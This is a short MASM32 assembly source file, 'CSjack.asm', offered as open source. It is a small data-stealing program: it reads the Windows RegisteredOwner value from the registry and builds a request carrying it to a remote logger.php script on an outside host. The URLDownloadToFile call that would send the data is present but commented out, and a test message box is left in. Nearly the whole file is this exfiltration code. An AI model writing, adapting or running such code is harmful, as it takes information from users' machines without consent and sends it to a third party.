;CSjack.asm is open source if you use it or part of it please
;contact me xillwillx@yahoo.com

.386
.model  flat,stdcall
option  casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
include \masm32\include\advapi32.inc
include \masm32\include\masm32.inc
include \masm32\include\user32.inc
include \masm32\include\urlmon.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\urlmon.lib

.data  
 szKey        db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\',0,64 dup(0)
 szSubKey     db 'RegisteredOwner',0,64 dup(0)
 WinKeySize   DWORD 255 
 szURL        db 'http://www.website.com/~poo/logger.php',0,32 dup(0)
 fmt          db '%s?action=log&jacked=%s',0


.data?
 WinKeyData   db 128 dup(?)
 TheReturn    DWORD ? 
 wKey         dd ? 
 strbuf       db 256 dup(?)

.code
  start:    
       invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,addr szKey,0,KEY_READ,addr TheReturn
       invoke RegQueryValueEx,TheReturn,addr szSubKey,0,0,addr WinKeyData, addr WinKeySize 
       invoke RegCloseKey , TheReturn
       invoke MessageBox,0,addr WinKeyData,addr szSubKey,0   ; uncomment for testing purposes
       invoke wsprintf, addr strbuf, addr fmt,addr szURL,addr WinKeyData
       ;invoke URLDownloadToFile, 0, addr strbuf,0, 0, 0
       invoke  ExitProcess, eax
end start
